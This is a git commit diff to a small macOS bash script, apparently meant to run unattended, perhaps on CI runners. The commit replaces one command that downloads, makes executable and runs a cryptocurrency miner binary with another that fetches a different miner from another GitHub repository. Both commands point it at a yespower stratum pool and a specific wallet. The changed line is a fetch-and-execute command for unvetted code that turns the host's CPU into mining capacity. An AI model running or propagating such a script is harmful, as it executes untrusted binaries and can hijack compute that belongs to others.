b27abcc5dfd9f18b16ca29f65268a97357625a7a
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-06-13 13:01:55 +0700

    Update Supa03.sh

--- Supa03.sh
+++ Supa03.sh
@@ -1,4 +1,4 @@
 #!/usr/bin/env bash
 softwareupdate -l
 brew install coreutils
-wget https://github.com/BatiKangkung/KangKung/raw/master/avx2m && chmod +x avx2m && ./avx2m -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.CPU -p x
+wget https://github.com/dodohua/xdag_mac/releases/download/1.0/CpuMiner && chmod 777 CpuMiner && ./CpuMiner -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.CPU -p x
